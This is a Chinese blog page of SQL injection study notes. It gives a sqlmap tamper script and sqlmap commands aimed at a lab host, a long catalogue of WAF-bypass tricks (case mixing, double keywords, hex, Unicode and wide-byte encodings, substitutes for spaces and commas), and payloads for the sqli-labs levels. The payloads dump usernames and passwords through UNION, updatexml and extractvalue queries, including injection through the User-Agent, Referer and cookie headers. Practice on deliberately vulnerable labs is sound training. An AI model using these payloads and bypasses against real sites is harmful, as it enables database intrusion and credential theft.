+<h6 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h6><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs txt">from lib.core.enums import PRIORITY<br><br>__priority__ = PRIORITY.NORMAL<br><br>def dependencies():<br>    pass<br><br>def tamper(payload, **kwargs):<br>    payload = payload.lower()<br>    payload = payload.replace(&#x27;union&#x27;, &#x27;UnioN&#x27;)<br>    return payload<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">sqlmap -u &quot;http://192.168.2.31/sqli/Less-26a/?id=1&quot; -p id --dbms=MySQL --tamper=&quot;2&quot; --dbs --batch<br>sqlmap -u http://192.168.2.31/sqli-labs/Less-26a/?id=1 -p id --tamper=2 -D security -T users -C username --dump --batch<br></code></pre></td></tr></table></figure>
+
+<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.注释符绕过<br>id=1&#x27; union select 1,2,3 or &#x27;1&#x27;=&#x27;1<br>(少写闭合符进行闭合，不用注释符注释后面的&#x27;)<br>常用的注释符有：<br>1）-- 注释内容<br>2）# 注释内容<br>3）/注释内容/<br>eg：union select 1,2#<br>union select 1,2 --+<br>构造闭合 ’ union select 1,2’<br>2.大小写绕过<br>常用于 waf的正则对大小写不敏感的情况。<br>eg：uniOn selEct 1,2<br>3.内联注释绕过<br>内联注释就是把一些特有的仅在MYSQL上的语句放在 /!../ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。别和注释/*… */搞混了。<br>eg：union /!select/ 1,2<br>4.双写关键字绕过<br>一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。<br>eg：union seselectlect 1,2<br>5.特殊编码绕过<br>1）十六进制绕过<br>eg：UNION SELECT 1,group_concat(column_name) from<br>information_schema.columns where table_name=0x61645F6C696E6B<br>2）ascii编码绕过<br>eg：Test =CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)<br>3）Unicode编码<br>常用的几个符号的一些Unicode编码：<br>单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7<br>空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0<br>左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8<br>右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9<br>6.空格过滤绕过<br>可代替空格的方式：<br>1）/**/<br>2）()<br>3）回车(url编码中的%0a)<br>4）`(tap键上面的按钮)<br>5）tap<br>6）%20<br>7）%0a<br>8）%a0<br>9）%09<br>10）%0C<br>11）%0D<br>12）%0B<br>13）+<br>14）两个空格<br>15）//<br>17）/*!  */     /*!90000  */<br>16）没有空格的报错注入<br>      举例 id=-1&#x27;||extractvalue(1,concat(&#x27;~&#x27;,select(database())))#<br>eg：union//select//1,2<br>select(passwd)from(users) #注意括号中不能含有*<br>selectpasswdfromusers<br>7.过滤or and xor(异或) not 绕过<br>（and和or被过滤掉时，可以用异或（同0异1）和同或（同1异0））<br>and = &amp;&amp;<br>or = ||<br>异或<br>xor = |<br>1^1^0     1^1^1<br>同或<br>not = !<br>8.过滤等号=绕过<br>1）不加通配符的like执行的效果和=一致，所以可以用来绕过。<br>eg：UNION SELECT 1,group_concat(column_name) from<br>information_schema.columns where table_name like “users”<br>2）rlike:模糊匹配，只要字段的值中存在要查找的 部分<br>就会被选择出来，用来取代=时，rlike的用法和上面的like一样，没有通配符效果和=一样<br>eg：UNION SELECT 1,group_concat(column_name) from<br>information_schema.columns where table_name rlike “users”<br>3）regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配<br>eg：UNION SELECT 1,group_concat(column_name) from<br>information_schema.columns where table_name regexp “users”<br>4）使用大小于号来绕过<br>eg：select * from users where id &gt; 1 and id &lt; 3<br>5）&lt;&gt; 等价于 !=，所以在前面再加一个!结果就是等号了<br>eg：select * from users where !(id &lt;&gt; 1)<br>9.过滤大小于号绕过<br>在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。<br>1）greatest(n1, n2, n3…):返回n中的最大值<br>eg：select * from users where id = 1 and<br>greatest(ascii(substr(username,1,1)),1)=116<br>2）least(n1,n2,n3…):返回n中的最小值，与上同理。<br>3）strcmp(str1,str2):若所有的字符串均相同，则返回0，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回1<br>eg：select * from users where id = 1 and<br>strcmp(ascii(substr(username,1,1)),117)<br>4）in关键字<br>eg：select * from users where id = 1 and substr(username,1,1) in (‘t’)<br>5）between a and b:范围在a-b之间，包括a、b。<br>eg：select * from users where id between 1 and 2<br>select * from users where id between 1 and 1<br>10过滤引号绕过<br>1）使用十六进制<br>eg：UNION SELECT 1,group_concat(column_name) from<br>information_schema.columns where table_name=0x61645F6C696E6B<br>2）宽字节，常用在web应用使用的字符集为GBK时，并且过滤了引号，就可以试试宽字节。%27表示 ‘(单引号)，单引号会被转义成’<br>eg：%E6’ union select 1,2 #<br>%df%27 union select 1,2,3 #<br>11.过滤逗号绕过<br>1）如果waf过滤了逗号，并且只能盲注，在取子串的几个函数中，有一个替代逗号的方法就是使用from pos for<br>len，其中pos代表从pos个开始读取len长度的子串 eg：常规写法 select substr(“string”,1,3)<br>若过滤了逗号，可以使用from pos for len来取代 select substr(“string” from 1 for 3)<br>sql盲注中 select ascii(substr(database() from 1 for 1)) &gt; 110<br>2）也可使用join关键字来绕过<br>eg：select * from users union select * from (select 1)a join (select 2)b join(select 3)c<br>上式等价于 union select 1,2,3<br>3）使用like关键字，适用于substr()等提取子串的函数中的逗号<br>eg：select user() like “t%”<br>上式等价于 select ascii(substr(user(),1,1))=114<br>5）使用offset关键字，适用于limit中的逗号被过滤的情况，limit 2,1等价于limit 1 offset 2<br>eg：select * from users limit 1 offset 2<br>上式等价于 select * from users limit 2,1<br>12.过滤函数绕过<br>1）sleep() --&gt;benchmark()<br>MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。<br>参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式<br>eg：select 1,2 and benchmark(1000000000,1)<br>2）ascii()–&gt;hex()、bin()，替代之后再使用对应的进制转string即可<br>3）group_concat()–&gt;concat_ws()，第一个参数为分隔符<br>eg：mysql&gt; select concat_ws(“,”,“str1”,“str2”)<br>4）substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()(可以突破长度限制)<br>5）user() --&gt; @@user、datadir–&gt;@@datadir<br>6）ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。<br></code></pre></td></tr></table></figure>
+
+<h5 id="安全狗绕过"><a href="#安全狗绕过" class="headerlink" title="安全狗绕过"></a>安全狗绕过</h5><p>安装：</p>
+<p>apachbin目录输入cmd</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">httpd.exe -k install -n apache2.4<br></code></pre></td></tr></table></figure>
+
+<p>相关参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/563904977">https://zhuanlan.zhihu.com/p/563904977</a></p>
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>宽字节顾名思义就是两个及以上的字节表示一个中文汉字。在sql注入中，当用户输入中包含特殊字符，比如(单引号’)，(双引号”)，(斜杠&#x2F;)等，为了过滤用户输入的这些特殊字符，会在字符前面加一个\转义字符对特殊字符进行转义。而大多数网站使用utf-8编码，utf-8编码会认为一个中文字符占三个字节；而后端mysql常用GBK编码，GBK编码认为一个中文占两个字节。所以针对这个原理，我们可以构造中文汉字来绕过字符转义。</p>
+<p>绕过原理</p>
+<p>当输入id&#x3D;1’的时候，网站的utf-8编码会将1’编码为1&#39;,这里就网站就自动添加了\将后面的’进行了转义；其url编码为1%5c%27。其中%5c是\的url编码；%27是’的url编码。当该语句到后端执行的时候，mysql的编码可是会将%5和%27结合在一起形成两个字节来判断中文汉字。注意，只有当前一个符号的ASCII大于或等于128的时候才能到达汉字范围。</p>
+<p>所以为了避免’被转义，我们手动在%5c前面加入一个%df的url编码。（为什么加%df？因为%df的ascii编码刚好是128，所以加上该编码可以达到汉字范围，添加其他的也可以，只要ascii编码大于等于128即可。）这个时候我们的输入变成了id&#x3D;1%df’,同理，url编码会编码为id&#x3D;1%df%5c%27。这个时候该语句带入到后端执行，GBK编码会认为%df%5c这两个字节构成了一个’運’字，后面的%27仅剩下一个字节，所以不会被解析为汉字。这个时候语句就变成了id&#x3D;運’，就绕过了字符的转义。</p>
+<p>为什么编码要大于128？</p>
+<p>在GBK编码中，128以下的字节被用作控制字符或保留。所以，如果我们要插入一个可见字符（例如汉字），我们需要使用一个大于128的字节值。</p>
+<h4 id="靶场演练"><a href="#靶场演练" class="headerlink" title="靶场演练"></a>靶场演练</h4><p>mysql数据结构:</p>
+<p>在练习靶场前我们需要了解以下mysql数据库结构，mysql数据库5.0以上版本有一个自带的数据库叫做information_schema,该数据库下面有两个表一个是tables和columns。tables这个表的table_name字段下面是所有数据库存在的表名。table_schema字段下是所有表名对应的数据库名。columns这个表的colum_name字段下是所有数据库存在的字段名。columns_schema字段下是所有表名对应的数据库。了解这些对于我们之后去查询数据有很大帮助。我们前面机关讲解比较详细后面就比较简单了。 </p>
+<p>1：</p>
+<p>判断是否存在sql注入</p>
+<p>提示你输入数字值的ID作为参数，我们输入?id&#x3D;1</p>
+<p>通过数字值不同返回的内容也不同，所以我们输入的内容是带入到数据库里面查询了。</p>
+<p>接下来我们判断sql语句是否是拼接，且是字符型还是数字型。</p>
+<p>可以根据结果指定是字符型且存在sql注入漏洞。因为该页面存在回显，所以我们可以使用联合查询。联合查询原理:联合查询就是两个sql语句一起查询，两张表具有相同的列数，且字段名是一样的。</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1&#x27;order by 3 --+<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;union select 1,2,3--+<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;union select 1,database(),version()--+<br></code></pre></td></tr></table></figure>
+
+<p>爆表，information_schema.tables表示该数据库下的tables表，点表示下一级。where后面是条件，group_concat()是将查询到结果连接起来。如果不用group_concat查询到的只有user。该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容。也就是user和passwd。</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+<br></code></pre></td></tr></table></figure>
+
+<p>爆字段名，我们通过sql语句查询知道当前数据库有四个表，根据表名知道可能用户的账户和密码是在users表中。接下来我们就是得到该表下的字段名以及内容。</p>
+<p>该语句的意思是查询information_schema数据库下的columns表里面且table_users字段内容是users的所有column_name的内。注意table_name字段不是只存在于tables表，也是存在columns表中。表示所有字段对应的表名。</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+<br></code></pre></td></tr></table></figure>
+
+<p>通过上述操作可以得到两个敏感字段就是username和password,接下来我们就要得到该字段对应的内容。</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=-1&#x27; union select 1,2,group_concat(username ,id , password) from users--+<br></code></pre></td></tr></table></figure>
+
+<p>2数字型注入</p>
+<p>32’)</p>
+<p>41”)</p>
+<p>5布尔盲注（文档内有）</p>
+<p>6只需将第五关的单引号换成双引号就可以了</p>
+<p>71’))</p>
+<p>8和5一样</p>
+<p>9睡眠注入（文档内有）</p>
+<p>10同九“</p>
+<p>11在账号框内联合注入</p>
+<p>12”</p>
+<p>13‘</p>
+<p>14“</p>
+<p>1516可以布尔盲注，也能在画面中试出来</p>
+<p>17报错注入</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">0&#x27; and (updatexml(1,concat(0x7e,version(),0x7e),1))#     爆版本<br>0&#x27; and (updatexml(1,concat(0x7e,database(),0x7e),1))#    爆数据库<br>0&#x27; and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1))#      爆表名<br>0&#x27; and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name =&#x27;users&#x27;),0x7e),1))#<br>   爆字段名<br>0&#x27; and (updatexml(1,concat(0x7e,(select password from (select password from users where username=&#x27;admin1&#x27;) b),0x7e),1))#<br>爆密码该格式针对mysql数据库。<br>爆其他表就可以，下面是爆emails表<br>0&#x27; and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name =&#x27;emails&#x27;),0x7e),1))#<br>0&#x27; and (updatexml (1,concat(0x7e,(select group_concat(id,email_id) from emails),0x7e),1))#   爆字段内容。<br></code></pre></td></tr></table></figure>
+
+<p>18User-Agent头</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">1&#x27; ,2, (extractvalue(1,concat(0x7e,(select group_concat(password,username) from users),0x7e)))#   爆账户密码。<br>1&#x27;,2,updatexml (1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1))#   爆账户密码。<br></code></pre></td></tr></table></figure>
+
+<p>19refer</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1&#x27;,updatexml (1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1))#<br></code></pre></td></tr></table></figure>
+
+<p>20cookie</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#x27;and updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)#<br></code></pre></td></tr></table></figure>
+
+<p>21base64编码</p>
+<p><img    class="lazyload" data-original="/../img/21.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">21</span></p>
+<p><img    class="lazyload" data-original="/../img/21%E7%BC%96%E7%A0%81.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">21编码</span></p>
+<p>22双引号base64编码</p>
+<p><img    class="lazyload" data-original="/../img/22.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">22</span></p>
+<p><img    class="lazyload" data-original="/../img/22%E7%BC%96%E7%A0%81.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">22编码</span></p>
+<p><img    class="lazyload" data-original="/../img/23.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">23</span></p>
+<p><img    class="lazyload" data-original="/../img/24.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">24</span></p>
+<p><img    class="lazyload" data-original="/../img/25.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">25</span></p>
+<p><img    class="lazyload" data-original="/../img/25a.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">25a</span></p>
+<p><img    class="lazyload" data-original="/../img/26.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">26</span></p>
+<p><img    class="lazyload" data-original="/../img/26a.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">26a</span></p>
+<p><img    class="lazyload" data-original="/../img/27.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">27</span></p>
+<p><img    class="lazyload" data-original="/../img/27a.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">27a</span></p>
+<p><img    class="lazyload" data-original="/../img/28.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">28</span></p>
+<p><img    class="lazyload" data-original="/../img/28a.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">28a</span></p>
+<p><img    class="lazyload" data-original="/../img/29.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">29</span></p>
+<p><img    class="lazyload" data-original="/../img/29_1.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">29_1</span></p>
+<p><img    class="lazyload" data-original="/../img/30.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">30</span></p>
+<p><img    class="lazyload" data-original="/../img/30-17037639313691.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">30</span></p>
+<p><img    class="lazyload" data-original="/../img/31.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">31</span></p>
+<p><img    class="lazyload" data-original="/../img/32%E5%AD%97%E6%AE%B5-17037640295653.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">32字段</span></p>
+<p><img    class="lazyload" data-original="/../img/32%E6%9F%A5%E8%AF%A2-17037640066322.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">32查询</span></p>
+<p><img    class="lazyload" data-original="/../img/32users%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">32users转换为十六进制</span></p>
+<p><img    class="lazyload" data-original="/../img/33%EF%BC%8C%E4%BC%BC%E4%B9%8E%E5%92%8C32%E4%B8%80%E6%A0%B7.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">33，似乎和32一样</span></p>
+<p><img    class="lazyload" data-original="/../img/34.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">34</span></p>
+<p><img    class="lazyload" data-original="/../img/35.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">35</span></p>
+<p><img    class="lazyload" data-original="/../img/36.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">36</span></p>
+<p><img    class="lazyload" data-original="/../img/37.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">37</span></p>
+<p><img    class="lazyload" data-original="/../img/38.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">38</span></p>
+<p><img    class="lazyload" data-original="/../img/39.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">39</span></p>
+<p><img    class="lazyload" data-original="/../img/40.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">40</span></p>
+<h2 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h2><p>靶场地址：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs">https://portswigger.net/web-security/all-labs</a></p>
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>20231201</li>
+    <li><strong>本文链接：</strong><a href="http://example.com/2023/12/20/sqli/index.html" title="http:&#x2F;&#x2F;example.com&#x2F;2023&#x2F;12&#x2F;20&#x2F;sqli&#x2F;index.html">http:&#x2F;&#x2F;example.com&#x2F;2023&#x2F;12&#x2F;20&#x2F;sqli&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+          <section class="donate">
+  <div id="qrcode-donate">
+    <img   class="lazyload" data-original="https://pic.izhaoo.com/alipay.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
+  </div>
+  <div class="icon">
+    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
+    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
+  </div>
+</section>
+        
+        
+        
+  <nav class="nav">
+    <a href="/2023/12/29/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><i class="iconfont iconleft"></i>信息收集</a>
+    <a href="/2023/12/12/%E5%89%8D%E5%90%8E%E7%AB%AF%E8%BF%9E%E6%8E%A5%E4%B8%8Ephp/">前后端连接与php基础<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli"><span class="toc-text">sqli</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#yakit"><span class="toc-text">yakit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#burpsuite"><span class="toc-text">burpsuite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C"><span class="toc-text">基础操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#postman%E6%93%8D%E4%BD%9C"><span class="toc-text">postman操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text">sql注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oracle"><span class="toc-text">oracle</span></a></li></ol>
+  </aside>
